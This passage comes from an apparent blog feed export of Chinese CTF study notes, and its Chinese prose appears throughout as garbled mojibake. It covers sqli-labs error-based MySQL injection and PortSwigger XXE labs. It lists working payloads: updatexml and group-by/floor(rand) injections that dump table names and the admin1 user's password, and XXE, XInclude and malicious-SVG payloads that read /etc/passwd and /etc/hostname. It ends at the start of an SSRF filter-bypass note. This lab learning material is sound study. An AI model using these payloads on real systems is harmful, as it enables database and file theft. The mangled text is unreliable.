<h3 id="updatexmlæŠ¥é”™æ³¨å…¥"><a href="#updatexmlæŠ¥é”™æ³¨å…¥" class="headerlink" title="updatexmlæŠ¥é”™æ³¨å…¥"></a>updatexmlæŠ¥é”™æ³¨å…¥</h3><p>UPDATEXML (XML_document, XPath_string, new_value)</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p>
<p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ï¼Œæ”¹å˜XML_documentä¸­ç¬¦åˆXPATH_stringçš„å€¼</p>
<blockquote>
<p>123â€™ and (updatexml(1,concat(0x5c,version(),0x5c),1))#     çˆ†ç‰ˆæœ¬<br>123â€™ and (updatexml(1,concat(0x5c,database(),0x5c),1))#    çˆ†æ•°æ®åº“</p>
</blockquote>
<blockquote>
<p>123â€™ and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c),1))#      çˆ†è¡¨å<br>123â€™ and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€™securityâ€™ and table_name &#x3D;â€™usersâ€™),0x5c),1))#<br>çˆ†å­—æ®µå</p>
</blockquote>
<blockquote>
<p>123â€™ and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;â€™admin1â€™) b),0x5c),1))#<br>çˆ†å¯†ç è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚<br>çˆ†å…¶ä»–è¡¨å°±å¯ä»¥ï¼Œä¸‹é¢æ˜¯çˆ†emailsè¡¨<br>123â€™ and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€™securityâ€™ and table_name &#x3D;â€™emailsâ€™),0x5c),1))#</p>
</blockquote>
<blockquote>
<p>1â€™ and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   çˆ†å­—æ®µå†…å®¹ã€‚</p>
</blockquote>
<h3 id="group-byæŠ¥é”™æ³¨å…¥"><a href="#group-byæŠ¥é”™æ³¨å…¥" class="headerlink" title="group byæŠ¥é”™æ³¨å…¥"></a>group byæŠ¥é”™æ³¨å…¥</h3><blockquote>
<p>123â€™ and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)<em>2)))#     çˆ†æ•°æ®åº“<br>123â€™ and (select count(</em>) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      çˆ†æ•°æ®åº“ç‰ˆæœ¬</p>
</blockquote>
<blockquote>
<p>1â€™ and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e,floor(rand(0)<em>2)))#    é€šè¿‡ä¿®æ”¹limitåé¢æ•°å­—ä¸€ä¸ªä¸€ä¸ªçˆ†è¡¨<br>1â€™ and (select count(</em>) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#        çˆ†å‡ºæ‰€æœ‰è¡¨</p>
</blockquote>
<blockquote>
<p>1â€™ and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;â€™usersâ€™),0x7e,floor(rand(0)<em>2)))#    çˆ†å‡ºæ‰€æœ‰å­—æ®µå<br>1â€™ and (select count(</em>) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    çˆ†å‡ºæ‰€æœ‰å­—æ®µå</p>
</blockquote>
<blockquote>
<p>1â€™ and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;â€™admin1â€™),0x7e,floor(rand(0)*2)))a)#    çˆ†å‡ºè¯¥è´¦æˆ·çš„å¯†ç ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PortSwigger-XXE</title>
    <url>/2023/03/11/PortSwigger-XXE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="ä»€ä¹ˆæ˜¯-XML-å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-XML-å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ</h2><p>XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸º XXEï¼‰æ˜¯ä¸€ç§ Web å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å¹²æ‰°åº”ç”¨ç¨‹åºå¯¹ XML æ•°æ®çš„å¤„ç†ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…æŸ¥çœ‹åº”ç”¨ç¨‹åºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œå¹¶ä¸åº”ç”¨ç¨‹åºæœ¬èº«å¯ä»¥è®¿é—®çš„ä»»ä½•åç«¯æˆ–å¤–éƒ¨ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</p>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XXE æ¼æ´æ‰§è¡ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ (SSRF) æ”»å‡»ï¼Œä»è€Œå‡çº§ XXE æ”»å‡»ä»¥ç ´ååº•å±‚æœåŠ¡å™¨æˆ–å…¶ä»–åç«¯åŸºç¡€è®¾æ–½ã€‚</p>
<h2 id="XXEæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ"><a href="#XXEæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title="XXEæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ"></a>XXEæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ</h2><p>ä¸€äº›åº”ç”¨ç¨‹åºä½¿ç”¨ XML æ ¼å¼åœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚æ‰§è¡Œæ­¤æ“ä½œçš„åº”ç”¨ç¨‹åºå®é™…ä¸Šæ€»æ˜¯ä½¿ç”¨æ ‡å‡†åº“æˆ–å¹³å° API æ¥å¤„ç†æœåŠ¡å™¨ä¸Šçš„ XML æ•°æ®ã€‚XXE æ¼æ´çš„å‡ºç°æ˜¯å› ä¸º XML è§„èŒƒåŒ…å«å„ç§æ½œåœ¨å±é™©çš„ç‰¹æ€§ï¼Œè€Œæ ‡å‡†è§£æå™¨æ”¯æŒè¿™äº›ç‰¹æ€§ï¼Œå³ä½¿å®ƒä»¬é€šå¸¸ä¸è¢«åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚<br>XML å¤–éƒ¨å®ä½“æ˜¯ä¸€ç§è‡ªå®šä¹‰ XML å®ä½“ï¼Œå…¶å®šä¹‰çš„å€¼æ˜¯ä»å£°æ˜å®ƒä»¬çš„ DTD å¤–éƒ¨åŠ è½½çš„ã€‚ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œå¤–éƒ¨å®ä½“ç‰¹åˆ«æœ‰è¶£ï¼Œå› ä¸ºå®ƒä»¬å…è®¸æ ¹æ®æ–‡ä»¶è·¯å¾„æˆ– URL çš„å†…å®¹å®šä¹‰å®ä½“ã€‚</p>
<h2 id="XMLå®ä½“"><a href="#XMLå®ä½“" class="headerlink" title="XMLå®ä½“"></a>XMLå®ä½“</h2><h3 id="ä»€ä¹ˆæ˜¯XMLï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯XMLï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯XMLï¼Ÿ"></a>ä»€ä¹ˆæ˜¯XMLï¼Ÿ</h3><p>XML ä»£è¡¨â€œå¯æ‰©å±•æ ‡è®°è¯­è¨€â€ã€‚XML æ˜¯ä¸€ç§è®¾è®¡ç”¨äºå­˜å‚¨å’Œä¼ è¾“æ•°æ®çš„è¯­è¨€ã€‚ä¸ HTML ä¸€æ ·ï¼ŒXML ä½¿ç”¨æ ‘çŠ¶ç»“æ„çš„æ ‡è®°å’Œæ•°æ®ã€‚ä¸ HTML ä¸åŒï¼ŒXML ä¸ä½¿ç”¨é¢„å®šä¹‰çš„æ ‡ç­¾ï¼Œå› æ­¤å¯ä»¥ä¸ºæ ‡ç­¾æŒ‡å®šæè¿°æ•°æ®çš„åç§°ã€‚åœ¨ç½‘ç»œå†å²çš„æ—©æœŸï¼ŒXML ä½œä¸ºä¸€ç§æ•°æ®ä¼ è¾“æ ¼å¼å¾ˆæµè¡Œï¼ˆâ€œAJAXâ€ä¸­çš„â€œXâ€ä»£è¡¨â€œXMLâ€ï¼‰ã€‚ä½†å®ƒçš„å—æ¬¢è¿ç¨‹åº¦ç°åœ¨å·²ç»ä¸‹é™ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ JSON æ ¼å¼ã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯-XML-å®ä½“ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-XML-å®ä½“ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML å®ä½“ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ XML å®ä½“ï¼Ÿ</h3><p>XML å®ä½“æ˜¯ä¸€ç§åœ¨ XML æ–‡æ¡£ä¸­è¡¨ç¤ºæ•°æ®é¡¹çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ•°æ®æœ¬èº«ã€‚XML è¯­è¨€è§„èŒƒä¸­å†…ç½®äº†å„ç§å®ä½“ã€‚ä¾‹å¦‚ï¼Œå®ä½“<code>&amp;lt;</code>å’Œ<code>&amp;gt;</code>è¡¨ç¤ºå­—ç¬¦&lt;å’Œ&gt;ã€‚è¿™äº›æ˜¯ç”¨äºè¡¨ç¤º XML æ ‡è®°çš„å…ƒå­—ç¬¦ï¼Œå› æ­¤å½“å®ƒä»¬å‡ºç°åœ¨æ•°æ®ä¸­æ—¶ï¼Œé€šå¸¸å¿…é¡»ä½¿ç”¨å®ƒä»¬çš„å®ä½“æ¥è¡¨ç¤ºã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Ÿ</h3><p>XML æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) åŒ…å«å¯ä»¥å®šä¹‰ XML æ–‡æ¡£çš„ç»“æ„ã€å®ƒå¯ä»¥åŒ…å«çš„æ•°æ®å€¼çš„ç±»å‹ä»¥åŠå…¶ä»–é¡¹ç›®çš„å£°æ˜ã€‚DTD åœ¨DOCTYPEXML æ–‡æ¡£å¼€å¤´çš„å¯é€‰å…ƒç´ ä¸­å£°æ˜ã€‚DTD å¯ä»¥å®Œå…¨ç‹¬ç«‹äºæ–‡æ¡£æœ¬èº«ï¼ˆç§°ä¸ºâ€œå†…éƒ¨ DTDâ€ï¼‰ï¼Œä¹Ÿå¯ä»¥ä»å…¶ä»–åœ°æ–¹åŠ è½½ï¼ˆç§°ä¸ºâ€œå¤–éƒ¨ DTDâ€ï¼‰ï¼Œæˆ–è€…å¯ä»¥æ˜¯ä¸¤è€…çš„æ··åˆã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯-XML-è‡ªå®šä¹‰å®ä½“ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-XML-è‡ªå®šä¹‰å®ä½“ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML è‡ªå®šä¹‰å®ä½“ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ XML è‡ªå®šä¹‰å®ä½“ï¼Ÿ</h3><p>XML å…è®¸åœ¨ DTD ä¸­å®šä¹‰è‡ªå®šä¹‰å®ä½“ã€‚ä¾‹å¦‚ï¼š</p>
<blockquote>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code><br>æ­¤å®šä¹‰æ„å‘³ç€ XML æ–‡æ¡£ä¸­å¯¹å®ä½“å¼•ç”¨çš„ä»»ä½•ä½¿ç”¨éƒ½&amp;myentity;å°†æ›¿æ¢ä¸ºå®šä¹‰çš„å€¼ï¼šâ€œ my entity valueâ€ã€‚</p>
</blockquote>
<h3 id="ä»€ä¹ˆæ˜¯-XML-å¤–éƒ¨å®ä½“ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-XML-å¤–éƒ¨å®ä½“ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ XML å¤–éƒ¨å®ä½“ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ XML å¤–éƒ¨å®ä½“ï¼Ÿ</h3><p>XML å¤–éƒ¨å®ä½“æ˜¯ä¸€ç§è‡ªå®šä¹‰å®ä½“ï¼Œå…¶å®šä¹‰ä½äºå£°æ˜å®ƒä»¬çš„ DTD ä¹‹å¤–ã€‚</p>
<p>å¤–éƒ¨å®ä½“çš„å£°æ˜ä½¿ç”¨å…³é”®å­—SYSTEMï¼Œå¹¶ä¸”å¿…é¡»æŒ‡å®šåº”ä»ä¸­åŠ è½½å®ä½“å€¼çš„ URLã€‚ä¾‹å¦‚ï¼š</p>
<blockquote>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code><br>URL å¯ä»¥ä½¿ç”¨è¯¥file:&#x2F;&#x2F;åè®®ï¼Œå› æ­¤å¯ä»¥ä»æ–‡ä»¶åŠ è½½å¤–éƒ¨å®ä½“ã€‚ä¾‹å¦‚ï¼š</p>
</blockquote>
<blockquote>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p>
</blockquote>
<h2 id="åˆ©ç”¨XXEæ‰§è¡ŒSSRFæ”»å‡»"><a href="#åˆ©ç”¨XXEæ‰§è¡ŒSSRFæ”»å‡»" class="headerlink" title="åˆ©ç”¨XXEæ‰§è¡ŒSSRFæ”»å‡»"></a>åˆ©ç”¨XXEæ‰§è¡ŒSSRFæ”»å‡»</h2><p><img src="https://img-blog.csdnimg.cn/61f07784b7f245fd8f31186f0f1043f3.png" alt="1">è¿›å…¥ç½‘ç«™åœ¨<strong>æ£€æŸ¥å•†åº—å•†åº—</strong>æ—¶ï¼Œç½‘ç«™æäº¤äº†POSTè¯·æ±‚ï¼Œæ‰“å¼€ä¹‹åçœ‹åˆ°æœ‰XML<br><img src="https://img-blog.csdnimg.cn/6afd2b71181c40dca1a5c0ca2efe8f27.png" alt="1"><br>ä¸å¦¨æ„é€ XXEã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/3a23d819d8834ca6aee716adc370b6f6.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/ea03a4027ab14aa79ec1121e48d6c6f0.png" alt="3"><br>è·Ÿç€ä»–è¯´çš„ä¾æ¬¡è®¿é—®ï¼Œç›´åˆ°æ‰¾åˆ°ACCESSkeyid<br><img src="https://img-blog.csdnimg.cn/9fc4a18f08df4f498ec23ab9850abc09.png" alt="5"></p>
<h2 id="XincludeæŠ€æœ¯"><a href="#XincludeæŠ€æœ¯" class="headerlink" title="XincludeæŠ€æœ¯"></a>XincludeæŠ€æœ¯</h2><p>XInclude æ˜¯ä¸€ç§æ”¯æŒå°†å¤šä¸ª XML æ–‡æ¡£ä¸­çš„å†…å®¹åŒ…å«åœ¨å•ä¸ª XML æ–‡æ¡£ä¸­çš„æŠ€æœ¯ã€‚å®ƒæ˜¯ XML æŠ€æœ¯å®¶æ—çš„ä¸€éƒ¨åˆ†ï¼Œæ—¨åœ¨ç®€åŒ–å¤§å‹ XML æ–‡æ¡£çš„åˆ›å»ºå’Œç®¡ç†ã€‚</p>
<p>ä½¿ç”¨ XIncludeï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªâ€œä¸»â€XML æ–‡æ¡£ï¼Œè¯¥æ–‡æ¡£å°†å…¶ä»– XML æ–‡æ¡£ä½œä¸ºâ€œå­æ–‡æ¡£â€å¼•ç”¨ã€‚è¿™äº›å­æ–‡æ¡£å¯ä»¥æŒ‰å€¼æˆ–å¼•ç”¨åŒ…å«åœ¨å†…ï¼Œç”Ÿæˆçš„ä¸»æ§æ–‡æ¡£å¯ä»¥ç”¨ä½œç‹¬ç«‹çš„ XML æ–‡æ¡£ã€‚</p>
<p>XInclude ä½¿ç”¨ XML å‘½åç©ºé—´ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
xmlns:xi="http://www.w3.org/2001/XInclude"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>XInclude æ”¯æŒä¸¤ç§ç±»å‹çš„åŒ…å«ï¼šæŒ‰å¼•ç”¨åŒ…å«å’ŒæŒ‰å€¼åŒ…å«ã€‚å½“æ‚¨å¸Œæœ›å°†å¤–éƒ¨æ–‡æ¡£ä½œä¸º URI åŒ…å«æ—¶ï¼Œå°†ä½¿ç”¨æŒ‰å¼•ç”¨åŒ…å«ï¼Œè€Œå½“æ‚¨å¸Œæœ›åŒ…å«å¤–éƒ¨æ–‡æ¡£çš„å®é™…å†…å®¹æ—¶ï¼Œåˆ™ä½¿ç”¨æŒ‰å€¼åŒ…å«ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªåŒ…å«å¤–éƒ¨æ–‡æ¡£çš„ XInclude è¯­å¥ç¤ºä¾‹ï¼Œè¯¥è¯­å¥ä½¿ç”¨æŒ‰å¼•ç”¨åŒ…å«ï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xml<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä¸‹é¢æ˜¯ä¸€ä¸ªåŒ…å«å¤–éƒ¨æ–‡æ¡£çš„ XInclude è¯­å¥ç¤ºä¾‹ï¼Œè¯¥è¯­å¥ä½¿ç”¨ include-by-valueï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>XInclude å¯ä»¥ä¸ä»»ä½• XML æ–‡æ¡£ä¸€èµ·ä½¿ç”¨ï¼Œå¹¶ä¸”å®ƒå—åˆ° XML è§£æå™¨å’Œç¼–è¾‘å™¨çš„å¹¿æ³›æ”¯æŒã€‚å®ƒèƒ½å¤Ÿç®€åŒ–å¤§å‹ XML æ–‡æ¡£çš„åˆ›å»ºå’Œç®¡ç†ï¼Œä½¿å…¶æˆä¸ºå¼€å‘äººå‘˜å’Œå†…å®¹åˆ›å»ºè€…çš„å®è´µå·¥å…·ã€‚</p>
<p>ä¸€äº›åº”ç”¨ç¨‹åºæ¥æ”¶å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼Œåœ¨æœåŠ¡å™¨ç«¯å°†å…¶åµŒå…¥åˆ° XML æ–‡æ¡£ä¸­ï¼Œç„¶åè§£æè¯¥æ–‡æ¡£ã€‚å½“å®¢æˆ·ç«¯æäº¤çš„æ•°æ®è¢«æ”¾å…¥åç«¯ SOAP è¯·æ±‚ï¼Œç„¶åç”±åç«¯ SOAP æœåŠ¡å¤„ç†æ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µçš„ä¸€ä¸ªç¤ºä¾‹ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•æ‰§è¡Œç»å…¸çš„ XXE æ”»å‡»ï¼Œå› ä¸ºæ‚¨æ— æ³•æ§åˆ¶æ•´ä¸ª XML æ–‡æ¡£ï¼Œå› æ­¤æ— æ³•å®šä¹‰æˆ–ä¿®æ”¹å…ƒç´ <code>DOCTYPE</code>ã€‚ä½†æ˜¯ï¼Œæ‚¨ä¹Ÿè®¸å¯ä»¥æ”¹ç”¨<code>XInclude</code>ã€‚<code>XInclude</code>æ˜¯ XML è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸ä»å­æ–‡æ¡£æ„å»º XML æ–‡æ¡£ã€‚æ‚¨å¯ä»¥<code>XInclude</code>åœ¨ XML æ–‡æ¡£ä¸­çš„ä»»ä½•æ•°æ®å€¼ä¸­è¿›è¡Œæ”»å‡»ï¼Œå› æ­¤å¯ä»¥åœ¨æ‚¨ä»…æ§åˆ¶æ”¾ç½®åœ¨æœåŠ¡å™¨ç«¯ XML æ–‡æ¡£ä¸­çš„å•ä¸ªæ•°æ®é¡¹çš„æƒ…å†µä¸‹æ‰§è¡Œæ”»å‡»ã€‚</p>
<p>è¦æ‰§è¡Œ<code>XInclude</code>æ”»å‡»ï¼Œæ‚¨éœ€è¦å¼•ç”¨<code>XInclude</code>å‘½åç©ºé—´å¹¶æä¾›æ‚¨å¸Œæœ›åŒ…å«çš„æ–‡ä»¶çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ-XXE-æ”»å‡»"><a href="#é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ-XXE-æ”»å‡»" class="headerlink" title="é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ XXE æ”»å‡»"></a>é€šè¿‡æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ XXE æ”»å‡»</h2><p>ä¸€äº›åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œå¤„ç†ã€‚ä¸€äº›å¸¸è§çš„æ–‡ä»¶æ ¼å¼ä½¿ç”¨ XML æˆ–åŒ…å« XML å­ç»„ä»¶ã€‚åŸºäº XML çš„æ ¼å¼çš„ç¤ºä¾‹æ˜¯åŠå…¬æ–‡æ¡£æ ¼å¼ï¼ˆå¦‚ DOCXï¼‰å’Œå›¾åƒæ ¼å¼ï¼ˆå¦‚ SVGï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·ä¸Šä¼ å›¾åƒï¼Œå¹¶åœ¨ä¸Šä¼ ååœ¨æœåŠ¡å™¨ä¸Šå¤„ç†æˆ–éªŒè¯è¿™äº›å›¾åƒã€‚å³ä½¿åº”ç”¨ç¨‹åºå¸Œæœ›æ¥æ”¶ PNG æˆ– JPEG ç­‰æ ¼å¼ï¼Œæ­£åœ¨ä½¿ç”¨çš„å›¾åƒå¤„ç†åº“ä¹Ÿå¯èƒ½æ”¯æŒ SVG å›¾åƒã€‚ç”±äº SVG æ ¼å¼ä½¿ç”¨ XMLï¼Œæ”»å‡»è€…å¯ä»¥æäº¤æ¶æ„ SVG å›¾åƒï¼Œä»è€Œè¾¾åˆ° XXE æ¼æ´çš„éšè—æ”»å‡»é¢ã€‚</p>
<p><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨</title>
    <url>/2023/03/10/%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-SSRF-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡-SSRF-è¿‡æ»¤å™¨"><a href="#é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡-SSRF-è¿‡æ»¤å™¨" class="headerlink" title="é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨"></a>é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨</h2><p>æœ‰æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´æ¥è§„é¿ä»»ä½•ç±»å‹çš„åŸºäºè¿‡æ»¤å™¨çš„é˜²å¾¡ã€‚</p>
<p>åœ¨å‰é¢çš„ SSRF ç¤ºä¾‹ä¸­ï¼Œå‡è®¾ç”¨æˆ·æäº¤çš„ URL è¢«ä¸¥æ ¼éªŒè¯ä»¥é˜²æ­¢æ¶æ„åˆ©ç”¨ SSRF è¡Œä¸ºã€‚ä½†æ˜¯ï¼Œå…è®¸ä½¿ç”¨ URL çš„åº”ç”¨ç¨‹åºå­˜åœ¨å¼€æ”¾é‡å®šå‘æ¼æ´ã€‚å¦‚æœç”¨äºå‘å‡ºåç«¯ HTTP è¯·æ±‚çš„ API æ”¯æŒé‡å®šå‘ï¼Œæ‚¨å¯ä»¥æ„å»ºä¸€ä¸ªæ»¡è¶³è¿‡æ»¤å™¨çš„ URLï¼Œå¹¶å°†è¯·æ±‚é‡å®šå‘åˆ°æ‰€éœ€çš„åç«¯ç›®æ ‡ã€‚</p>
